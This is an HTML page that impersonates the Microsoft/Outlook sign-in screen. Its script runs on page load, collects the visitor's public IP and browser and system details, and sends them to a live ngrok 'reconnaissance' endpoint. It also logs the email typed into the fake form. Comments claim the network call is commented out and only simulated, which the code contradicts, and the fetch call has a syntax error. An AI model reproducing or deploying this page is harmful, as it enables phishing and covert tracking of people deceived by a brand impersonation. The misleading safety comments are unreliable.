<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Sign In</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for an Outlook/Microsoft look */
        body {
            font-family: 'Inter', sans-serif;
            /* Light blue/white gradient background typical of Microsoft pages */
            background: linear-gradient(to bottom right, #f2f6ff, #ffffff);
            min-height: 100vh;
        }
        .info-card {
            @apply bg-white p-10 rounded shadow-2xl w-full max-w-sm;
        }
        .outlook-logo {
            /* Mimics the blue bar logo */
            @apply text-2xl font-semibold text-gray-800 mb-6;
        }
        .input-style {
            @apply w-full p-2 border border-gray-300 focus:border-blue-600 outline-none;
        }
        .blue-button {
            @apply w-full bg-blue-600 text-white font-semibold py-2 rounded transition hover:bg-blue-700;
        }
    </style>
</head>
<body class="p-4 flex items-center justify-center">

    <!-- Mock Outlook Login Page -->
    <div class="info-card">
        <header class="outlook-logo flex items-center">
            <!-- Simplified logo appearance -->
            <svg class="w-6 h-6 mr-2 text-blue-600" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M14.417 8.35a.833.833 0 00-1.666 0v3.317c0 .46-.373.833-.834.833H6.383a.833.833 0 00-.834.834v3.316a.833.833 0 001.666 0v-2.483h4.117a2.5 2.5 0 002.5-2.5V8.35zM7.167 6.667a.833.833 0 00-1.667 0v1.666h1.667V6.667zM14.417 5a.833.833 0 00-1.667 0v1.667h1.667V5zM14.417 11.667a.833.833 0 00-1.667 0v1.666h1.667v-1.666z"></path></svg>
            Microsoft Sign in
        </header>

        <h2 class="text-2xl font-normal mb-6">Sign in</h2>

        <!-- Placeholder Login Form -->
        <form onsubmit="handleLoginAttempt(event)">
            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style mb-4" required>
            
            <p id="status-message" class="text-sm text-gray-500 mb-6 hidden">
                <span id="ip-loader" class="text-xs text-blue-500 hidden">Fetching details...</span>
            </p>

            <div class="flex justify-end">
                <button type="submit" class="blue-button">Next</button>
            </div>
        </form>

        <p class="mt-8 text-sm text-blue-600 hover:underline cursor-pointer">
            No account? Create one!
        </p>
        <p class="text-sm text-blue-600 hover:underline cursor-pointer">
            Sign in with a security key
        </p>
    </div>
    <!-- End Mock Outlook Login Page -->

    <script>
        const MOCK_API_ENDPOINT = 'https://rank-postdigital-fern.ngrok-free.dev/api/log_reconnaissance_data/';

        // Global variables to store collected data
        let publicIP = 'N/A';
        let browserVendor = 'N/A';
        let browserLanguage = 'N/A';
        let osPlatform = 'N/A';
        let userAgent = navigator.userAgent;

        const ipLoaderEl = document.getElementById('ip-loader');
        const statusMessageEl = document.getElementById('status-message');


        /**
         * Function to fetch the user's public IP address using an external API.
         */
        async function fetchIP() {
            ipLoaderEl.classList.remove('hidden');
            
            const maxRetries = 3;
            let delay = 1000;

            for (let attempt = 0; attempt < maxRetries; attempt++) {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    const data = await response.json();
                    publicIP = data.ip;
                    return true; // Success
                } catch (error) {
                    console.error(`Attempt ${attempt + 1}: Could not fetch public IP address.`, error);
                    if (attempt === maxRetries - 1) {
                        publicIP = 'IP Fetch Failed';
                        return false; // Failure after max retries
                    } else {
                        await new Promise(resolve => setTimeout(resolve, delay));
                        delay *= 2; // Exponential backoff
                    }
                }
            }
        }

        /**
         * Function to gather browser and system details via the 'navigator' object.
         */
        function gatherBrowserDetails() {
            // Determine browser vendor/engine (best effort)
            let vendor = 'Unknown';
            if (userAgent.indexOf("Chrome") !== -1 && userAgent.indexOf("Edg") === -1) {
                vendor = 'Google Chrome';
            } else if (userAgent.indexOf("Firefox") !== -1) {
                vendor = 'Mozilla Firefox';
            } else if (userAgent.indexOf("Safari") !== -1 && userAgent.indexOf("Chrome") === -1) {
                vendor = 'Apple Safari';
            } else if (userAgent.indexOf("Edg") !== -1) {
                vendor = 'Microsoft Edge';
            } else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) {
                vendor = 'Internet Explorer';
            }
            
            browserVendor = vendor;
            browserLanguage = navigator.language || 'N/A';
            osPlatform = navigator.platform || navigator.oscpu || 'N/A';
        }


        /**
         * Simulates sending the reconnaissance data to a mock server endpoint.
         * This function demonstrates the background activity without actual server logic.
         */
        async function sendReconDataToServer(details) {
            console.log('%c--- SIMULATING SERVER TRANSMISSION ---', 'color: orange; font-weight: bold;');
            
            // Console logging the data payload that would be sent
            console.groupCollapsed(`%cData Payload Sent to Mock Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
            console.table(details);
            console.groupEnd();

            // Note: The actual fetch call to a real server is commented out for safety.
        
            try {
                const response = await fetch(MOCK_API_ENDPOINT, {
                    method: 'GET,
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(details)
                });
                if (response.ok) {
                    console.log('Data successfully logged on server.');
                }
            } catch (error) {
                console.error('Failed to send data.', error);
            }
        
            console.log('Transmission simulation complete. Data is now logged on the (fictional) server.');
        }


        /**
         * Handles the login button click. For safety, this simulates a login error 
         * and prevents sending user input data.
         */
        function handleLoginAttempt(event) {
            event.preventDefault(); // Stop form submission
            const userInput = document.getElementById('user-input').value;

            statusMessageEl.textContent = 'Account not found. Please check your credentials.';
            statusMessageEl.classList.remove('hidden', 'text-blue-500', 'text-green-600');
            statusMessageEl.classList.add('text-red-600');
            
            console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
            console.log(`User attempted login with email/phone: ${userInput}`);
            console.log('Input logging disabled for security compliance.');
        }


        /**
         * Main function to gather all details and start the process.
         */
        async function collectAndSendDetails() {
            statusMessageEl.classList.remove('hidden');
            ipLoaderEl.textContent = 'Gathering initial system data...';
            
            // 1. Gather fixed browser details
            gatherBrowserDetails();
            
            // 2. Fetch IP (simulated delay/loading)
            await fetchIP(); 

            // 3. Compile the initial data payload
            const dataDetails = {
                fetchTime: new Date().toISOString(),
                event: "PageLoadRecon",
                publicIP: publicIP,
                browserVendor: browserVendor,
                osPlatform: osPlatform,
                browserLanguage: browserLanguage,
                userAgent: userAgent
            };
            
            // 4. Simulate sending non-sensitive data to server
            await sendReconDataToServer(dataDetails);

            ipLoaderEl.textContent = 'System data collection completed in background.';
            ipLoaderEl.classList.remove('text-blue-500');
            ipLoaderEl.classList.add('text-green-600');
            
            // Hide status after a few seconds
            setTimeout(() => {
                statusMessageEl.classList.add('hidden');
            }, 5000);
        }

        // Start the background process automatically when the page is loaded
        document.addEventListener('DOMContentLoaded', collectAndSendDetails);
    </script>
</body>
</html>
